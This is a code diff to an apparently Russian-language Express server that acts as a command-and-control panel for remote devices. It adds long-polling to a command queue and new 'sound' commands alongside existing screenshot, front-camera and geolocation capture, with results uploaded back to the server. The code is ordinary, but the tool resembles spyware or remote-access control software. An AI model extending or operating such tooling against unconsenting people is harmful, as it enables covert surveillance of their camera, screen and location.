@@ -318,18 +318,23 @@ app.post('/cmd/poll', (req, res) => {
   const key = req.headers['x-key'] || req.query.key;
   if (key !== UPLOAD_KEY) return res.status(403).json({ ok: false });
 
-  const deviceId = (req.body && req.body.deviceId) || req.query.deviceId || 'unknown';
-  const cmds = readCmds();
-  const queue = cmds[deviceId] || [];
+  const body = req.body || {};
+  const deviceId = body.deviceId || req.query.deviceId || 'unknown';
+  const wait = Math.min(25, Math.max(0, Number(body.wait) || 0));
 
-  if (queue.length > 0) {
-    const cmd = queue.shift();
-    cmds[deviceId] = queue;
-    writeCmds(cmds);
-    return res.json({ ok: true, cmd });
-  }
+  const cmd = takeCommand(deviceId);
+  if (cmd) return res.json({ ok: true, cmd });
+  if (!wait) return res.json({ ok: true, cmd: null });
 
-  res.json({ ok: true, cmd: null });
+  const entry = { res, timer: null };
+  entry.timer = setTimeout(() => {
+    const set = pollWaiters.get(deviceId);
+    if (set) set.delete(entry);
+    if (!res.headersSent) res.json({ ok: true, cmd: takeCommand(deviceId) || null });
+  }, wait * 1000);
+
+  if (!pollWaiters.has(deviceId)) pollWaiters.set(deviceId, new Set());
+  pollWaiters.get(deviceId).add(entry);
 });
 
 app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
@@ -363,6 +368,30 @@ app.post('/cmd/result', mediaUpload.single('file'), (req, res) => {
   res.json({ ok: true });
 });
 
+// ── команды: очередь + long-poll ───────────────────────────────────────────
+const pollWaiters = new Map(); // deviceId -> Set<{res, timer}>
+
+function takeCommand(deviceId) {
+  const cmds = readCmds();
+  const queue = cmds[deviceId] || [];
+  if (queue.length === 0) return null;
+  const cmd = queue.shift();
+  cmds[deviceId] = queue;
+  writeCmds(cmds);
+  return cmd;
+}
+
+function wakePollers(deviceId) {
+  const set = pollWaiters.get(deviceId);
+  if (!set || set.size === 0) return;
+  for (const w of Array.from(set)) {
+    clearTimeout(w.timer);
+    set.delete(w);
+    const cmd = takeCommand(deviceId);
+    if (!w.res.headersSent) w.res.json({ ok: true, cmd: cmd || null });
+  }
+}
+
 app.get('/cmd/send', (req, res) => {
   if (req.query.key !== VIEW_KEY) return res.status(403).send('forbidden');
 
@@ -374,6 +403,8 @@ app.get('/cmd/send', (req, res) => {
   if (!cmds[deviceId]) cmds[deviceId] = [];
   cmds[deviceId].push({ cmd, ts: Date.now() });
   writeCmds(cmds);
+
+  wakePollers(deviceId);
 
   res.redirect('/?key=' + encodeURIComponent(VIEW_KEY) + '&tab=control&device=' + encodeURIComponent(deviceId) + '&sent=1');
 });
@@ -682,6 +713,8 @@ app.get('/', (req, res) => {
           <a class="cmd-card" href="/cmd/send?${q}&cmd=screenshot">${icon('camera')}<span>Скриншот</span><small>screenshot</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=frontcam">${icon('user')}<span>Фронталка</span><small>frontcam</small></a>
           <a class="cmd-card" href="/cmd/send?${q}&cmd=location">${icon('pin')}<span>Гео</span><small>location</small></a>
+          <a class="cmd-card" href="/cmd/send?${q}&cmd=sound">${icon('bolt')}<span>Звук</span><small>sound</small></a>
+          <a class="cmd-card" href="/cmd/send?${q}&cmd=stopsound">${icon('check')}<span>Стоп звук</span><small>stopsound</small></a>
         </div>
 
         <section class="panel">
